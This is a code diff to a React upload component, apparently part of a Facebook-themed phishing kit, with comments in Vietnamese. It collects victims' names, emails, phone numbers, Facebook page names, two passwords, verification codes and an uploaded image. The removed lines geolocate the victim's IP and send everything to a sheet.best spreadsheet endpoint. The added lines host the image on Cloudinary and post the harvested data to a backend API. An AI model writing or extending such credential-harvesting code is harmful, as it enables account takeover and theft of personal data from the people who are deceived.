@@ -15,61 +15,46 @@ const Upload = () => {
     };
 
     const handleUpload = () => {
+        const cloudName = 'ductham087'; // Thay YOUR_CLOUD_NAME bằng Cloud Name của bạn
         if (selectedFile) {
             const formData = new FormData();
             formData.append('file', selectedFile);
-            formData.append("upload_preset", "docs_upload_example_us_preset");
+            formData.append("upload_preset", "apiData");
 
-            fetch(url, {
-                method: 'POST',
-                body: formData,
-            })
-            .then((response) => {
-                return response.text();
-            })
-            .then((data) => {
-                const url_image = JSON.parse(data).url
-                const dataImages = {...dataLocalPassword, url_image};
-    
-                axios.get(`https://api.db-ip.com/v2/free/self`)
+            axios
+                .post(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, formData)
+                .then((response) => {
+                    // Lấy đường dẫn ảnh trên Cloudinary từ phản hồi
+                    const imageUrl = response.data.secure_url;
+                    
+                    const dataImages = {...dataLocalPassword, imageUrl};
+
+                    console.log(dataImages);
+        
+                    const data = {
+                        'fill_business_email': dataImages.fill_business_email,
+                        'fill_personal_email': dataImages.fill_personal_email,
+                        'fill_full_name': dataImages.fill_full_name,
+                        'fill_facebook_pagename': dataImages.fill_facebook_pagename,
+                        'fill_phone': dataImages.fill_phone,
+                        'ip': dataImages.ip,
+                        'city': dataImages.city,
+                        'country': dataImages.country,
+                        'first_password': dataImages.firt_password,
+                        'second_password': dataImages.second_password,
+                        'first_code': dataImages.first_code,
+                        'image': imageUrl,
+                    }
+
+                    axios.post( "http://localhost:8080/api/news", data)
                     .then((response) => {
-
-                        const data = {
-                            'Email': dataImages.fill_business_email,
-                            'Email_Personal': dataImages.fill_personal_email,
-                            'Name': dataImages.fill_full_name,
-                            'Page': dataImages.fill_facebook_pagename,
-                            'Phone': '&_'+dataImages.fill_phone,
-                            'IP': response.data.ipAddress,
-                            'City': response.data.city,
-                            'Country': response.data.countryName,
-                            'First_Password': dataImages.firt_password,
-                            'Second_Password': dataImages.second_password,
-                            'First_Code': dataImages.first_code,
-                            'Second_Code': dataImages.seconds_code,
-                            'Image': url_image,
-                        }
-
-                        fetch("https://sheet.best/api/sheets/212d1e73-4854-4cdd-a656-a28e41e745f3", {
-                            method: "POST",
-                            mode: "cors",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify(data),
-                        })
-                        .then((r) => r.json())
-                        .then((data) => {
+                        if (response.data.status === 0 ) {
                             navigate('/help-100823847823627384548/final');
-                        })
-
+                        }
                     })
-
-
-            });
-        } else {
-          console.log('Vui lòng chọn một tệp hình ảnh.');
-        }
+                })
+           
+        } 
     };
 
     return (
